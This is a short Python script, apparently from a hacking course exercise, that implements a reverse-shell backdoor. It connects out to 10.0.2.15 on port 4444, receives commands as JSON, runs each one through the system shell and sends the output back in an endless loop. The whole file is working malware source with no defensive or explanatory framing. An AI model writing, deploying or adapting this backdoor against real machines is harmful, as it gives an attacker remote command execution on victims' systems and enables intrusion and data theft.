#!/usr/bin/env python

import socket
import subprocess
import json


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))  # actively initiates TCP server connection

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data.decode('utf-8'))
        self.connection.send(json_data.encode('utf-8'))  # sends TCP message

    def reliable_receive(self):
        json_data = ''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('utf-8')  # receives TCP message
                return json.loads(json_data)
            except ValueError:  # continue receiving until full data received
                continue

    def run(self):
        while True:
            # receive max 1024 bytes at a time - buffer size
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            self.reliable_send(command_result)
        connection.close()


my_backdoor = Backdoor("10.0.2.15", 4444)
my_backdoor.run()


